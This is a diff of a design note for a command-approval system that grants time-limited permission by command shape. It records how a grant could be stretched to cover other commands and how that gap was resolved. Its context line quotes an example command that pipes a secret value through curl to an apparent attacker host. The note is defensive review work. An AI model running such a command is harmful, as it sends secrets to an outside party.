@@ -596,12 +596,11 @@ head. `printf %s "$V" | sha256sum` and `printf %s "$V" | curl -d @- https://atta
 semicolon does the same. This is the case R4 says must not happen, that a grant for `ssh
 deploy@prod` never covers `curl` with the same token.
 
-The narrow fix follows the rule already beside it: a leading flag makes the shape the whole line,
-since a flag's value can hide the target, and a metacharacter hides it the same way. The owner
-deferred this on 2026-09-05, having broader guards in hand. Two things worth carrying into that
-design. The request sheet already prints "30 minutes covers {shape}" to the owner, so the shape
-string is a promise shown on screen and needs to be one worth reading. And a grant only ever
-matches on entry, shape, and session together, so narrowing the shape can never widen a grant.
+Resolved by `plans/operation-shape.md`: a window grant covers every shape the line's programs
+make, read from the unbash tree, and the display shape stays what the phone shows. The request
+sheet shows the operation and the grants tab lists the shape, so the shape is a promise
+shown on screen. A grant matches on entry, session and the set together, so narrowing a shape can
+never widen a grant.
 
 ### Bug Classes
 
